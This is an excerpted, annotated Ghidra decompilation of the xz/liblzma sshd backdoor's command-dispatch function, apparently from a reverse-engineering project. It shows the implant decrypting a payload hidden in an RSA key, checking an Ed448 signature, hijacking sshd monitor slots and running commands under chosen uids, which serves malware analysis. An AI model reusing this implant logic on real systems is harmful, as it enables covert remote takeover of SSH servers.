// /home/kali/xzre-ghidra/xzregh/1094A0_rsa_backdoor_command_dispatch.c
// Function: rsa_backdoor_command_dispatch @ 0x1094A0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall rsa_backdoor_command_dispatch(RSA * key, global_context_t * ctx, BOOL * do_orig)
...
BOOL rsa_backdoor_command_dispatch(RSA *key,global_context_t *ctx,BOOL *do_orig)
      ...
      if ((((rsa_exponent_bn != (BIGNUM *)0x0) && (hostkey_index != 0)) &&
        ...
        if ((ulong)(long)op_result <= rsa_payload_bytes) {
          ...
          if (((libc != (libc_imports_t *)0x0) && (libc->getuid != (pfn_getuid_t)0x0)) &&
            ...
            operation_ok = secret_data_decrypt_with_embedded_seed((u8 *)&key_idx,ctx);
            if ((operation_ok != FALSE) &&
               (operation_ok = chacha20_decrypt((u8 *)&data_s2,rsa_payload_span - 0x10,(u8 *)&key_idx,
                                          (u8 *)&payload_nonce_lo,(u8 *)&data_s2,ctx->imported_funcs),
               operation_ok != FALSE)) {
                  ...
                  if (((host_keys != (sshkey **)0x0) && (secrets->host_pubkeys != (sshkey **)0x0)) &&
                     ((host_keys != secrets->host_pubkeys &&
                      (((((uint)secrets->have_ssh2_key < 2 &&
                         ...
                         (operation_ok = count_null_terminated_ptrs
                                             (host_keys,(u64 *)((long)&socket_probe_header + 1),
                                              ctx->libc_imports), operation_ok != FALSE)) &&
                        (operation_ok = count_null_terminated_ptrs
                                            (ctx->sshd_sensitive_data->host_pubkeys,
                    ...
                    operation_ok = secret_data_decrypt_with_embedded_seed((u8 *)&shared_keybuf_or_timespec_lo,ctx);
                    if (operation_ok != FALSE) {
                      hostkey_cursor = 0;
                      do {
                        ...
                        operation_ok = verify_ed448_signed_payload
                                           (ctx->sshd_sensitive_data->host_pubkeys[hostkey_cursor],cmd_args_scratch
                                            ,_data_offset + 4,0x25c,(u8 *)&data_s2,(u8 *)&shared_keybuf_or_timespec_lo,
                                            ctx);
...
LAB_00109c8a:
                                  // AutoDoc: Opcode 0 repacks attacker-supplied bits into `ctx->sshd_offsets` so sshd_find_forged_modulus_sshbuf/sshbuf_extract_ptr_and_len can locate the kex sshbuf pointer slot, the monitor pkex_table slot, and the sshbuf data/size fields across builds.
...
LAB_00109d36:
                                                ...
                                                if ((control_flags & CMD_CTRL_FORCE_SOCKET_PROBE) == 0) {
                                                  ...
                                                  operation_ok = sshd_find_socket_fd_by_shutdown_probe
                                                                     ((int *)((long)&
                                                ...
                                                if (operation_ok != FALSE) {
                                                  ...
                                                  *(u8 *)&socket_probe_header = 0;
                                                      ...
                                                      if (-1 < pselect_result) {
                                                        if (((pselect_result != 0) &&
                                                            ((rsa_payload_bytes & *(ulong *)(cmd_args_scratch +
                                                             ...
                                                             != 0)) &&
                                                           (bytes_read = fd_read_full(op_result,&extra_data
                                                                                  ,4,libc),
                                                           -1 < bytes_read)) {
                                                          ...
                                                          if ((rsa_payload_span - 1 < 0x41) &&
                                                             (bytes_read = fd_read_full(op_result,&
                                                  socket_probe_header,1,libc), -1 < bytes_read)) {
                                                    ctx->sock_read_len =
                                                         (ulong)((uint)extra_data - 1);
                                                    bytes_read = fd_read_full(op_result,ctx->sock_read_buf,
                                                                          (ulong)((uint)extra_data -
                                                                                 1),libc);
                                                    if (-1 < bytes_read) {
                                                      sshd_ctx = ctx->sshd_ctx;
                                                      if (sshd_ctx->
                                                  ...
                                                  (sshd_monitor_func_t)0x0) {
                                                    ...
                                                    // AutoDoc: Select the monitor request opcode the attacker wants to impersonate and drop mm_answer_keyallowed_payload_dispatch_hook into the live slot so the next exchange hits the implant.
...
LAB_00109fb9:
                                    ...
                                    *(cmd_arguments_t **)(cmd_args_scratch + 8) = encrypted_payload_bytes;
                                    ...
                                    // AutoDoc: Expose the monitor payload length for opcode 3 so sshd_monitor_cmd_dispatch can treat the decrypted chunk as a forged monitor_data_t frame.
                                    *(u16 *)&monitor_payload_size_le = (short)payload_chunk_len;
                                    ...
                                    // AutoDoc: Opcode 3 populates a monitor_data_t and lets sshd_monitor_cmd_dispatch forge replies or run system commands under the requested uid/gid.
                                    operation_ok = sshd_monitor_cmd_dispatch
                                                       ((monitor_data_t *)cmd_args_scratch,ctx);
                                    if (operation_ok != FALSE) {
                                      ctx->disable_backdoor = TRUE;
                                      *do_orig = FALSE;
                                      return TRUE;
                      ...
                      if (ed448_raw_key != (byte *)0x0) {
                        ...
                        if (((loop_idx + 2U <= payload_body_len) &&
                          ...
                          if (((ctx->payload_bytes_buffered <= ctx->payload_buffer_size) &&
                            ...
                            operation_ok = verify_ed448_signed_payload
                                               (host_keys[ctx->sshd_host_pubkey_idx],
                                                ctx->payload_buffer,sshkey_digest_offset,
                                                ctx->payload_buffer_size,
                                                auStack_2d9 + payload_chunk_len + payload_data_offset + -2,ed448_raw_key,ctx
                                               );
